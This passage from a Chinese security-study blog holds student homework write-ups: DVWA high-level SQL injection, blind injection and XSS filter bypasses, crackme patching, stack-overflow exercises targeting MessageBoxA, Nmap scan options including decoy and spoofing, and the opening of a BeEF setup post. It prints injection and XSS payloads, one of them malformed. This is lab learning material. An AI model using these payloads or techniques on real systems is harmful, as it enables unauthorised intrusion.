<p>提交密码发现又有延时，感觉还加了别的什么，但是一看源码，随机延时<span lang=EN-US>0~3</span>秒<span lang=EN-US>……</span></p>
<p><span
lang=EN-US>2333</span></p>
<p><span lang=EN-US><img src="/2020/02/18/wsks/image075.jpg" class=""></span></p>
<p>我们依旧可以修改<span
lang=EN-US>burp suit</span>里<span lang=EN-US>intruder</span>的<span lang=EN-US>option</span>设置进行调整，使其等待最大延时时间即可。</p>
<p><span style='font-size:14.0pt;font-family:黑体'>SQLI:</span></p>
<p>这题还给了单独的输入界面</p>
<p><span lang=EN-US><img src="/2020/02/18/wsks/image076.jpg" class=""></span></p>
<p>测试了一下感觉你输入什么当前页面就会回显什么，并且在主页面输出回显结果</p>
<p>但是只有一行</p>
<p><span lang=EN-US><img src="/2020/02/18/wsks/image077.jpg" class=""></span></p>
<p>看一下源代码</p>
<p><span lang=EN-US><img src="/2020/02/18/wsks/image078.jpg" class=""></span></p>
<p>发现没有加什么东西，只加了一个<span
lang=EN-US>limit</span>来限制输出而已。</p>
<p>我们可以用<span
lang=EN-US>#</span>或者<span lang=EN-US>–+</span>注释掉，再用‘闭合掉单引号这里可以用联合注入配合<span
lang=EN-US>group_concat</span>多行回显。</p>
<p><span
lang=EN-US>1’or 1=1 group_concat(database()),1 from users #</span></p>
<p><span lang=EN-US><img src="/2020/02/18/wsks/image079.jpg" class=""></span></p>
<p>接下来的步骤与前面难度的大致一样，不再重复。</p>
<p><span style='font-size:14.0pt;font-family:黑体'>SQLBI:</span></p>
<p>怎么回事，怎么又是似曾相识的样子</p>
<p>按照<span
lang=EN-US>High</span>里的<span lang=EN-US>SQLI</span>的过滤来尝试</p>
<p><span lang=EN-US><img src="/2020/02/18/wsks/image080.jpg" class=""></span></p>
<p><span lang=EN-US><img src="/2020/02/18/wsks/image081.jpg" class=""></span></p>
<p>果然又是用<span
lang=EN-US>#</span>将后面的语句注释掉，再用单引号闭合<span lang=EN-US>limit</span>再配合<span
lang=EN-US>group_concat</span>即可。</p>
<p>发现注入点，我们可以利用。本来以为它是将<span
lang=EN-US>data</span>加密后存进<span lang=EN-US>cookie</span>中再进行提交的，这样抓包就无法修改，我们进行盲注的时候还需要猜测<span
lang=EN-US>cookie</span>的结构，很麻烦。但是<span lang=EN-US>…</span></p>
<p><span lang=EN-US><img src="/2020/02/18/wsks/image082.jpg" class=""></span></p>
<p>哦豁，他没有这么做，那我们继续用<span
lang=EN-US>intruder</span>来尝试盲注。</p>
<p>锁定爆破点</p>
<p><span lang=EN-US><img src="/2020/02/18/wsks/image083.jpg" class=""></span></p>
<p>设置<span
lang=EN-US>payload</span></p>
<p><span lang=EN-US><img src="/2020/02/18/wsks/image084.jpg" class=""></span></p>
<p><span
lang=EN-US>Start attack</span></p>
<p>发现长度都一致，很奇怪，仔细看发现因为</p>
<p><span
lang=EN-US>HTTP</span>头指向的是</p>
<p><span
lang=EN-US><img src="/2020/02/18/wsks/image085.jpg" class=""></span></p>
<p>这样不管怎么回显都是</p>
<p><span lang=EN-US><img src="/2020/02/18/wsks/image086.jpg" class=""></span></p>
<p>我们修改下请求头使其指向回显的页面</p>
<p><span lang=EN-US><img src="/2020/02/18/wsks/image087.jpg" class=""></span></p>
<p>再试试，发现成功了</p>
<p><span lang=EN-US><img src="/2020/02/18/wsks/image088.jpg" class=""></span></p>
<p>同样的方法可以爆库爆列名。感觉手动测试的时候有延迟，可能还存在一些东西，看看源代码。</p>
<p><span lang=EN-US><img src="/2020/02/18/wsks/image089.jpg" class=""></span></p>
<p>发现了<span
lang=EN-US>sleep</span>，那就意味着基于时间的盲注会不准确，因此我一开始尝试布尔注入避开了弯路。</p>
<p><span lang=EN-US style='font-size:14.0pt;font-family:黑体'>XSS_Reflected</span><span
style='font-size:14.0pt;font-family:黑体'>：</span></p>
<p>随手尝试<span
lang=EN-US>&lt;Script&gt;alert(1)&lt;/Script&gt;</span></p>
<table cellpadding=0 cellspacing=0 align=left>
 <tr>
  <td width=47 height=0></td>
 </tr>
 <tr>
  <td></td>
  <td><img src="/2020/02/18/wsks/image090.jpg" class=""></td>
 </tr>
</table>

<p>回显有点奇怪，猜测应该是正则掉了<span
lang=EN-US>script</span>，试试别的标签<span lang=EN-US>iframe</span>、<span lang=EN-US>img</span>之类的</p>
<p>例如<span
lang=EN-US>&lt;img src=1 onerror=alert(1)&gt;</span></p>
<p><span lang=EN-US><img src="/2020/02/18/wsks/image091.jpg" class=""></span></p>
<p>成功，查看下源代码，发现循环正则匹配<span
lang=EN-US>script</span>以及<span lang=EN-US>/i</span>，<span lang=EN-US>/i</span>参数的意思是无视大小写，这样使得<span
lang=EN-US>script</span>头很难通过正则，但是我们可以用别的标签头。</p>
<p><span lang=EN-US><img src="/2020/02/18/wsks/image092.jpg" class=""></span></p>
<p><span style='font-size:14.0pt;font-family:黑体'>XSS_Stored:</span></p>
<p>随手在<span
lang=EN-US>name</span>和<span lang=EN-US>messagebox</span>都尝试<span lang=EN-US>&lt;Scr&lt;script&gt;ipt&gt;alert(1)&lt;/Sc&lt;script&gt;ript&gt;</span></p>
<p><span lang=EN-US><img src="/2020/02/18/wsks/image093.jpg" class=""></span></p>
<p>这回显似曾相识，<span
lang=EN-US>name</span>试试别的标签头</p>
<p><span lang=EN-US><img src="/2020/02/18/wsks/image094.jpg" class=""></span></p>
<p><span
lang=EN-US>……</span>，和上一题很像嘛。</p>
<p>看看源代码</p>
<p><span lang=EN-US><img src="/2020/02/18/wsks/image095.jpg" class=""></span></p>
<p>果不其然。</p>
<h1 id="简单RE"><a href="#简单RE" class="headerlink" title="简单RE"></a><a name="_Toc26366751"><span style='font-size:18.0pt;font-family:黑体'>简单RE</span></a></h1><p>此次实验分别采用了<span lang=EN-US>WINDOWS10</span>和<span lang=EN-US>XP</span>系统。因为我一直以来写的都是<span lang=EN-US>web</span>不怎么会逆向，作业的完成寻求了队友的帮助，非常感谢。做个记录。</p>
<h2 id="Crackeme"><a href="#Crackeme" class="headerlink" title="Crackeme"></a><a name="_Toc26366752"><span style='font-size:15.0pt;font-family:黑体'>Crackeme</span></a></h2><p><span lang=EN-US>&nbsp;&nbsp;&nbsp; </span>首先将文件拖入<span
lang=EN-US>IDA</span></p>
<p><span lang=EN-US>&nbsp;&nbsp;&nbsp; </span>找到跳转点</p>
<p><span lang=EN-US>&nbsp;&nbsp;&nbsp; <img src="/2020/02/18/wsks/image096.jpg" class=""></span></p>
<p>跟进</p>
<p><span lang=EN-US>&nbsp;&nbsp;&nbsp; <img src="/2020/02/18/wsks/image097.jpg" class=""></span></p>
<p>发现这里的函数有个逻辑，条件不满足就跳转（<span
lang=EN-US>JZ</span>），即密码不正确就跳转</p>
<p><span lang=EN-US>&nbsp;</span></p>
<p><span lang=EN-US><img src="/2020/02/18/wsks/image098.jpg" class=""></span></p>
<p>我们将<span lang=EN-US>jz</span>改为<span lang=EN-US>jnz</span></p>
<p><span lang=EN-US><img src="/2020/02/18/wsks/image099.jpg" class=""></span></p>
<p>这时候逻辑会反过来，输入错误密码就不会跳转，输入正确的密码就会跳转。我们运行运行一下<span
lang=EN-US>exe</span>。</p>
<p>输入错误密码</p>
<p><span lang=EN-US><img src="/2020/02/18/wsks/image100.jpg" class=""></span></p>
<p>输入正确密码</p>
<p><span lang=EN-US><img src="/2020/02/18/wsks/image101.jpg" class=""></span></p>
<p>完成。</p>
<h2 id="Overflow1"><a href="#Overflow1" class="headerlink" title="Overflow1"></a><a name="_Toc26366753"><span style='font-size:15.0pt;font-family:黑体'>Overflow1</span></a></h2><p>先拖进<span
lang=EN-US>IDA</span>，设置断点，随便输入几个数，密码错误。</p>
<p><span lang=EN-US><img src="/2020/02/18/wsks/image101.jpg" class=""></span></p>
<p>找到断口，发现一个函数<span lang=EN-US><img src="/2020/02/18/wsks/image102.jpg" class=""></span></p>
<p>跟进一下，大致逻辑为将<span
lang=EN-US>a1</span>与<span lang=EN-US>1234567</span>进行比较，返回一个值给<span
lang=EN-US>v3</span>，之后将<span lang=EN-US>a1</span>复制给<span lang=EN-US>v2</span>，然后将逻辑值返回给<span
lang=EN-US>v3</span>。</p>
<p><span lang=EN-US><img src="/2020/02/18/wsks/image103.jpg" class=""></span></p>
<p>我们发现<span
lang=EN-US>v2</span>与<span lang=EN-US>v3</span>差了<span lang=EN-US>8</span>个字，那么此处可以拿来作为溢出点利用，有如下操作：</p>
<p>覆盖前</p>
<p><span lang=EN-US><img src="/2020/02/18/wsks/image104.jpg" class=""></span></p>
<p>输入大于<span
lang=EN-US>1234567</span>的<span lang=EN-US>8</span>位字符或数字都可以</p>
<p><span lang=EN-US><img src="/2020/02/18/wsks/image105.jpg" class=""></span></p>
<p>覆盖成功</p>
<p><span lang=EN-US><img src="/2020/02/18/wsks/image106.jpg" class=""></span></p>
<p>可以看到<span
lang=EN-US>exe</span></p>
<p><span lang=EN-US><img src="/2020/02/18/wsks/image107.jpg" class=""></span></p>
<p>成功</p>
<h2 id="Overflow2"><a href="#Overflow2" class="headerlink" title="Overflow2"></a><a name="_Toc26366754"><span style='font-size:15.0pt;font-family:黑体'>Overflow2</span></a></h2><p>与上面一样操作，先设置断点，找断口<span lang=EN-US><img src="/2020/02/18/wsks/image108.jpg" class=""></span></p>
<p>发现一个函数</p>
<p><span lang=EN-US><img src="/2020/02/18/wsks/image109.jpg" class=""></span></p>
<p>变成了文件输入，需要一个叫<span
lang=EN-US>password</span>的文件</p>
<p>写个文件</p>
<p><span lang=EN-US><img src="/2020/02/18/wsks/image110.jpg" class=""></span></p>
<p>运行</p>
<p><span lang=EN-US><img src="/2020/02/18/wsks/image111.jpg" class=""></span></p>
<p>找到我们刚才输入的东西</p>
<p><span lang=EN-US><img src="/2020/02/18/wsks/image112.jpg" class=""></span></p>
<p>回过来看上面的函数，好像这里可以用来溢出</p>
<p><span lang=EN-US><img src="/2020/02/18/wsks/image113.jpg" class=""></span></p>
<p>我们可以写一个文件用<span
lang=EN-US>8</span>个字符将其填充覆盖，之后再使用<span lang=EN-US>4</span>个字符来覆盖<span
lang=EN-US>main</span></p>
<p><span lang=EN-US><img src="/2020/02/18/wsks/image114.jpg" class=""></span></p>
<p>运行结果</p>
<p><span lang=EN-US><img src="/2020/02/18/wsks/image115.jpg" class=""></span></p>
<p>完成。</p>
<h2 id="Overflow3"><a href="#Overflow3" class="headerlink" title="Overflow3"></a><a name="_Toc26366755"><span lang=EN-US style='font-size:15.0pt;font-family:黑体'>Overflow3</span></a></h2><p>拖进<span
lang=EN-US>IDA</span>发现<span lang=EN-US>buffer</span>由<span lang=EN-US>8</span>字节变成<span
lang=EN-US>44</span>字节<span lang=EN-US>,</span>所以我们可以用<span lang=EN-US>44</span>个字节来覆盖<span
lang=EN-US>authenticated </span>低字节中的<span lang=EN-US> 1</span>在调试的过程中得到<span
lang=EN-US>buffer</span>的起始地址为<span lang=EN-US>OX0019FB2C.</span></p>
<p><span lang=EN-US style='color:black'><img src="/2020/02/18/wsks/image116.jpg" class=""></span></p>
<p>让程序弹出一个消息框只需要调用<br><span lang=EN-US>Windows </span>的 <span lang=EN-US>API </span>函数 <span
lang=EN-US>MessageBox</span>，而调用<span lang=EN-US>API</span>函数就需要将之翻译成机器代码，用十六进制填入<span
lang=EN-US>password.txt</span>中。用<span lang=EN-US>Dependency Walker</span>工具来获取函数<span
lang=EN-US>MessageBoxA</span>的入口地址。可以通过动态链接库<span lang=EN-US>user32.dll</span>在系统中加载的基址和<span
lang=EN-US>MessageBoxA</span>在库中的偏移相加得到。于是可得<span lang=EN-US>user32.dll </span>的基地址为<br><span lang=EN-US>0x69E00000</span>，<span lang=EN-US>MessageBoxA </span>的偏移地址为<span
lang=EN-US> 0x00080CD0</span>。基地址加上偏移地址就得到了 <span lang=EN-US>MessageBoxA </span>在内存中<br>的入口地址<span lang=EN-US> 0x69E80CD0</span>。第<span lang=EN-US> 53</span>～<span
lang=EN-US>56 </span>字节填入<span lang=EN-US> buffer </span>的起址<span lang=EN-US><br>0x0019FAA0</span>，其余的字节用<span lang=EN-US> 0x90</span>填充<span lang=EN-US>.</span></p>
<p><span lang=EN-US><img src="/2020/02/18/wsks/image117.jpg" class=""></span></p>
<p>运行<span
lang=EN-US>exe</span></p>
<p><span lang=EN-US><img src="/2020/02/18/wsks/image118.jpg" class=""></span></p>
<p>成功。</p>
<p>作业到此结束。</p>
</div>

<script src="/live2d-widget/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2d-widget/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":true,"model":{"scale":1,"hHeadPos":0.5,"vHeadPos":0.618,"jsonPath":"/live2d-widget/assets/live2d-widget-model-koharu/assets/koharu.model.json"},"display":{"superSample":2,"width":200,"height":400,"position":"right","hOffset":0,"vOffset":-20},"mobile":{"show":true,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.2}});</script><script src="/live2d-widget/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2d-widget/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":true,"model":{"scale":1,"hHeadPos":0.5,"vHeadPos":0.618,"jsonPath":"/live2d-widget/assets/live2d-widget-model-koharu/assets/koharu.model.json"},"display":{"superSample":2,"width":200,"height":400,"position":"right","hOffset":0,"vOffset":-20},"mobile":{"show":true,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.2}});</script></body>

</html>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://kkotori.github.io/2020/02/16/nmap/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="K_Kotori">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="WS">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2020/02/16/nmap/" class="post-title-link" itemprop="url">Nmap部分参数</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2020-02-16 16:49:53 / 修改时间：17:17:11" itemprop="dateCreated datePublished" datetime="2020-02-16T16:49:53+08:00">2020-02-16</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <html>

<head>
<meta http-equiv=Content-Type content="text/html; charset=gb2312">
<meta name=Generator content="Microsoft Word 15 (filtered)">
<style>
<!--
 /* Font Definitions */
 @font-face
        {font-family:宋体;
        panose-1:2 1 6 0 3 1 1 1 1 1;}
@font-face
        {font-family:"Cambria Math";
        panose-1:2 4 5 3 5 4 6 3 2 4;}
@font-face
        {font-family:等线;
        panose-1:2 1 6 0 3 1 1 1 1 1;}
@font-face
        {font-family:"\@等线";
        panose-1:2 1 6 0 3 1 1 1 1 1;}
@font-face
        {font-family:"\@宋体";
        panose-1:2 1 6 0 3 1 1 1 1 1;}
 /* Style Definitions */
 p.MsoNormal, li.MsoNormal, div.MsoNormal
        {margin:0cm;
        margin-bottom:.0001pt;
        text-align:justify;
        text-justify:inter-ideograph;
        font-size:10.5pt;
        font-family:等线;}
pre
        {mso-style-link:"HTML 预设格式 字符";
        margin:0cm;
        margin-bottom:.0001pt;
        font-size:12.0pt;
        font-family:宋体;}
span.HTML
        {mso-style-name:"HTML 预设格式 字符";
        mso-style-link:"HTML 预设格式";
        font-family:宋体;}
.MsoChpDefault
        {font-family:等线;}
 /* Page Definitions */
 @page WordSection1
        {size:595.3pt 841.9pt;
        margin:72.0pt 90.0pt 72.0pt 90.0pt;
        layout-grid:15.6pt;}
div.WordSection1
        {page:WordSection1;}
-->
</style>

</head>

<body lang=ZH-CN style='text-justify-trim:punctuation'>

<div class=WordSection1 style='layout-grid:15.6pt'>

<p>输入<span lang=EN-US>nmap -h </span>后会显示帮助页面 类似于<span lang=EN-US>man nmap</span>。</p>
<p><span lang=EN-US><img src="/2020/02/16/nmap/image001.jpg" class=""></span></p>
<p><span lang=EN-US>-sT </span>参数功能名称为<span lang=EN-US>TCP connect</span>扫描，即当<span lang=EN-US>SYN</span>扫描不能用时，<span lang=EN-US>TCP connect</span>扫描就是默认的<span lang=EN-US>TCP</span>扫描。优先级次于<span lang=EN-US>SYN</span>扫描。根据<span lang=EN-US>nmap</span>手册的部分功能注释：</p>
<p><span lang=EN-US>-sT </span>目标<span lang=EN-US>ip</span></p>
<p><span lang=EN-US><img src="/2020/02/16/nmap/image002.jpg" class=""></span></p>
<p><span lang=EN-US>-sS </span>参数功能名称为<span lang=EN-US>TCP SYN</span>扫描，即为默认的<span lang=EN-US>TCP connect</span>扫描。根据<span lang=EN-US>nmap</span>手册的注释：</p>
<p><span lang=EN-US>-sS </span>目标<span lang=EN-US>ip</span></p>
<p><span lang=EN-US>-sF;-sX;-sN </span>参数功能名称为<span lang=EN-US>TCP NULL,FIN,Xmas</span>扫描。 根据<span lang=EN-US>nmap</span>手册的注释：</p>
<p><span lang=EN-US>-sF/X/N </span>目标<span lang=EN-US>ip&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></p>
<p><span lang=EN-US>-sP</span>功能参数名称为<span lang=EN-US>ping</span>扫描。根据<span lang=EN-US>nmap</span>手册的功能注释：</p>
<p><span lang=EN-US>-sP </span>目标<span lang=EN-US>ip</span></p>
<p><span lang=EN-US>-sU </span>功能参数名称为<span lang=EN-US>TCP UDP</span>扫描。根据<span lang=EN-US>nmap</span>手册的功能注释：</p>
<p><span lang=EN-US>-sU </span>目标<span lang=EN-US>ip</span></p>
<p><span lang=EN-US>-sA </span>功能参数名称为<span lang=EN-US>TCP ACK</span>扫描。根据<span lang=EN-US>nmap</span>手册的功能注释：</p>
<p><span lang=EN-US>-sA </span>目标<span lang=EN-US>ip</span></p>
<p><span lang=EN-US><img src="/2020/02/16/nmap/image003.jpg" class=""></span></p>
<p><span lang=EN-US>-sR </span>参数的功能名称为<span lang=EN-US>TCP RPC</span>扫描。即为<span lang=EN-US>RFC</span>（远程函数调用）与其他方式结合的扫描。根据<span lang=EN-US>nmap</span>手册的功能注释：</p>
<p><span lang=EN-US>-sR </span>目标<span lang=EN-US>ip</span></p>
<p><span lang=EN-US>PS</span>：在测试过程中，<span lang=EN-US>nmap</span>告知<span lang=EN-US>7.70</span>版本的<span lang=EN-US>nmap</span>已将<span lang=EN-US>-sR</span>另起为<span lang=EN-US>-sV</span>的别名调用参数。</p>
<p>翻来翻去没有找到<span lang=EN-US>-M</span>，但是看到了<span lang=EN-US>-sM</span>，于是就分析<span lang=EN-US>-sM</span>吧</p>
<p><span lang=EN-US>-sM</span>参数功能名称为<span lang=EN-US>TCP Maimon</span>扫描，此技术由其发现者的名字命名。此技术与<span lang=EN-US>Null</span>，<span lang=EN-US>FIN</span>，以及<span lang=EN-US>Xmas</span>扫描完全一样，除了探测报文是<span lang=EN-US>FIN/ACK</span>。 根据<span lang=EN-US>RFC 793 (TCP)</span>，无论端口开放或者关闭，都应该对这样的探测响应<span lang=EN-US>RST</span>报文。根据<span lang=EN-US>nmap</span>手册的功能注释：</p>
<p><span lang=EN-US>-sM </span>目标<span lang=EN-US>IP</span></p>
<p><span lang=EN-US><img src="/2020/02/16/nmap/image004.jpg" class=""></span></p>
<p><span lang=EN-US>-P0</span>参数功能名称为无<span lang=EN-US>ping</span>扫描。即跳过<span lang=EN-US>nmap</span>的发现阶段并对指定的<span lang=EN-US>ip</span>或<span lang=EN-US>ip</span>地址空间（例<span lang=EN-US>192.168.1.0/24</span>）进行完全扫描。根据<span lang=EN-US>nmap</span>手册的功能注释：</p>
<p><span lang=EN-US>-P0 </span>目标<span lang=EN-US>ip</span>或<span lang=EN-US>ip</span>地址空间</p>
<p><span lang=EN-US><img src="/2020/02/16/nmap/image005.jpg" class=""></span></p>
<p><span lang=EN-US>-PT</span>参数功能名称为<span lang=EN-US>TCPping</span>扫描。即在扫描之前先使用<span lang=EN-US>ping</span>来测试哪些主机正在运行。根据<span lang=EN-US>nmap</span>手册的功能注释：</p>
<p><span lang=EN-US>-PT </span>目标<span lang=EN-US>ip</span></p>
<p><span lang=EN-US><img src="/2020/02/16/nmap/image006.jpg" class=""></span></p>
<p><span lang=EN-US>-PS</span>参数功能名称为<span lang=EN-US>TCP SYN</span>扫描。即发送了设置了<span lang=EN-US>SYN</span>标志位的空<span lang=EN-US>TCP</span>报文。根据<span lang=EN-US>nmap</span>手册的功能注释：</p>
<p><span lang=EN-US>-PS </span>目标<span lang=EN-US>ip</span></p>
<p><span lang=EN-US><img src="/2020/02/16/nmap/image007.jpg" class=""></span></p>
<p><span lang=EN-US>-PI </span>参数功能名称为<span lang=EN-US>ICMP echo</span>扫描。即使用<span lang=EN-US>ICMP echo</span>请求来扫描主机是否正在运行。根据<span lang=EN-US>nmap</span>手册的功能注释：</p>
<p><span lang=EN-US>-PI</span>目标<span lang=EN-US>ip</span></p>
<p><span lang=EN-US><img src="/2020/02/16/nmap/image008.jpg" class=""></span></p>
<p><span lang=EN-US>-PB </span>参数是默认的<span lang=EN-US>ping</span>扫描选项。它使用<span lang=EN-US>ACK(-PT)</span>和<span lang=EN-US>ICMP(-PI)</span>两种扫描类型并行扫描。假设防火墙只能过滤其中的一种包，则此种方式可能会穿越防火墙。根据<span
lang=EN-US>nmap</span>手册的功能注释：</p>
<p><span lang=EN-US>-PB </span>目标<span lang=EN-US>ip</span></p>
<p><span lang=EN-US><img src="/2020/02/16/nmap/image009.jpg" class=""></span></p>
<p><span lang=EN-US>-O </span>参数功能为启用操作系统检测。<span lang=EN-US>-A</span>功能与其类似，可以用<span lang=EN-US>-A</span>来同时启用操作系统检测和版本检测。根据<span lang=EN-US>nmap</span>手册注释：</p>
<p><span lang=EN-US>-O </span>目标<span lang=EN-US>ip</span></p>
<p><span lang=EN-US>-O –osscan-limit </span>目标<span lang=EN-US>ip (</span>针对指定目标进行操作系统检测<span lang=EN-US>)</span></p>
<p><span lang=EN-US>-O –osscan-guess;–fuzzy </span>目标<span lang=EN-US>ip(</span>推测操作系统检测结果<span lang=EN-US>)</span></p>
<p><span lang=EN-US><img src="/2020/02/16/nmap/image010.jpg" class=""></span></p>
<p><span lang=EN-US>-I</span><span style='font-size:10.5pt'>参数功能为打开<span lang=EN-US>nmap</span>的反向标志扫描功能。但是在<span lang=EN-US>7.70</span>版本的<span lang=EN-US>nmap</span>已经不支持了。</span><span lang=EN-US><img src="/2020/02/16/nmap/image011.jpg" class=""></span></p>
<p><span lang=EN-US>-f;-F;-v</span>参数分别为<span lang=EN-US>ip</span>报文分段，快速扫描，和详细模式可以结合使用。</p>
<p><span lang=EN-US><img src="/2020/02/16/nmap/image012.jpg" class=""></span></p>
<p><span lang=EN-US>-D</span>参数的功能为诱饵隐蔽扫描，即使用诱饵<span lang=EN-US>IP</span>来隐藏正在进行的扫描。根据<span lang=EN-US>nmap</span>手册的部分功能注释：</p>
<p><span lang=EN-US>-D &lt;decoy1 [</span>，<span lang=EN-US>decoy2][</span>，<span lang=EN-US>ME]</span>，<span lang=EN-US>…&gt; </span>目标<span lang=EN-US>IP</span></p>
<p>其中<span lang=EN-US>decoy</span>可以有多个并且用逗号分隔开，代表诱饵<span lang=EN-US>IP</span>。<span lang=EN-US>ME</span>选项的作用是将自身真实<span lang=EN-US>IP</span>作为诱饵，扫描中若不使用<span lang=EN-US>ME</span>，则<span lang=EN-US>nmap</span>会自动将真实<span lang=EN-US>IP</span>放在某一个位置。</p>
<p><span lang=EN-US><img src="/2020/02/16/nmap/image013.jpg" class=""></span></p>
<p><span lang=EN-US><img src="/2020/02/16/nmap/image014.jpg" class=""></span></p>
<p><span lang=EN-US>-S</span>参数的功能为源地址哄骗，即使目标主机认为是别的<span lang=EN-US>IP</span>在扫描，从而达到隐藏自身的作用。根据<span lang=EN-US>nmap</span>手册的功能注释：</p>
<p><span lang=EN-US>-e &lt;interface&gt; </span>指定接口</p>
<p><span lang=EN-US>–spoof-mac &lt;mac address</span>，<span lang=EN-US>prefix</span>，<span lang=EN-US>or vendor name&gt; </span>源<span lang=EN-US>mac</span>地址哄骗</p>
<p><span lang=EN-US>–source-port &lt;portnumber&gt;; -g &lt;portnumber&gt; </span>源端口哄骗 （<span lang=EN-US>-g</span>与<span lang=EN-US>–source-port</span>等价）</p>
</div>

<script src="/live2d-widget/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2d-widget/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":true,"model":{"scale":1,"hHeadPos":0.5,"vHeadPos":0.618,"jsonPath":"/live2d-widget/assets/live2d-widget-model-koharu/assets/koharu.model.json"},"display":{"superSample":2,"width":200,"height":400,"position":"right","hOffset":0,"vOffset":-20},"mobile":{"show":true,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.2}});</script><script src="/live2d-widget/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2d-widget/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":true,"model":{"scale":1,"hHeadPos":0.5,"vHeadPos":0.618,"jsonPath":"/live2d-widget/assets/live2d-widget-model-koharu/assets/koharu.model.json"},"display":{"superSample":2,"width":200,"height":400,"position":"right","hOffset":0,"vOffset":-20},"mobile":{"show":true,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.2}});</script></body>

</html>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://kkotori.github.io/2020/02/16/beefu/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="K_Kotori">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="WS">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2020/02/16/beefu/" class="post-title-link" itemprop="url">Beef的利用</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2020-02-16 16:14:37 / 修改时间：16:32:13" itemprop="dateCreated datePublished" datetime="2020-02-16T16:14:37+08:00">2020-02-16</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <html>

<head>
<meta http-equiv=Content-Type content="text/html; charset=gb2312">
<meta name=Generator content="Microsoft Word 15 (filtered)">
<style>
<!--
 /* Font Definitions */
 @font-face
        {font-family:宋体;
        panose-1:2 1 6 0 3 1 1 1 1 1;}
@font-face
        {font-family:"Cambria Math";
        panose-1:2 4 5 3 5 4 6 3 2 4;}
@font-face
        {font-family:等线;
        panose-1:2 1 6 0 3 1 1 1 1 1;}
@font-face
        {font-family:"\@等线";
        panose-1:2 1 6 0 3 1 1 1 1 1;}
@font-face
        {font-family:"\@宋体";
        panose-1:2 1 6 0 3 1 1 1 1 1;}
 /* Style Definitions */
 p.MsoNormal, li.MsoNormal, div.MsoNormal
        {margin:0cm;
        margin-bottom:.0001pt;
        text-align:justify;
        text-justify:inter-ideograph;
        font-size:10.5pt;
        font-family:等线;}
a:link, span.MsoHyperlink
        {color:#0563C1;
        text-decoration:underline;}
pre
        {mso-style-link:"HTML 预设格式 字符";
        margin:0cm;
        margin-bottom:.0001pt;
        font-size:12.0pt;
        font-family:宋体;}
span.HTML
        {mso-style-name:"HTML 预设格式 字符";
        mso-style-link:"HTML 预设格式";
        font-family:宋体;}
span.hljs-comment
        {mso-style-name:hljs-comment;}
.MsoChpDefault
        {font-family:等线;}
 /* Page Definitions */
 @page WordSection1
        {size:595.3pt 841.9pt;
        margin:72.0pt 90.0pt 72.0pt 90.0pt;
        layout-grid:15.6pt;}
div.WordSection1
        {page:WordSection1;}
-->
</style>

</head>

<body lang=ZH-CN link="#0563C1" vlink="#954F72" style='text-justify-trim:punctuation'>

<div class=WordSection1 style='layout-grid:15.6pt'>

<p>本次学习需要用到<span lang=EN-US>kali2 linux</span>以及<span
lang=EN-US>DVWA</span>环境。已搭建好本地服务器，在此不再赘述。</p>
<p>首先打开<span lang=EN-US>BEEF</span>工具并开启<span lang=EN-US>dvwa</span>网站，安全等级设置为<span lang=EN-US>low</span>。</p>
<p><span lang=EN-US><img src="/2020/02/16/beefu/image001.jpg" class=""><img src="/2020/02/16/beefu/image002.jpg" class=""></span></p>
<p><span lang=EN-US>cat /etc/beef-xss/config.yaml</span>查看<span lang=EN-US>,</span>之后使用<span lang=EN-US>vim</span>来修改。<span lang=EN-US>Vim <span class=hljs-comment>/etc/beef-xss/config.yaml</span></span>先按下<span
lang=EN-US>i</span>键，进入插入模式，修改密码用户名，再输入<span lang=EN-US>:wq</span>完成写入保存。之后登录<span lang=EN-US>beef</span>。</p>
<p><span lang=EN-US><img src="/2020/02/16/beefu/image003.jpg" class=""></span></p>
<p>接下来我们按照注释</p>
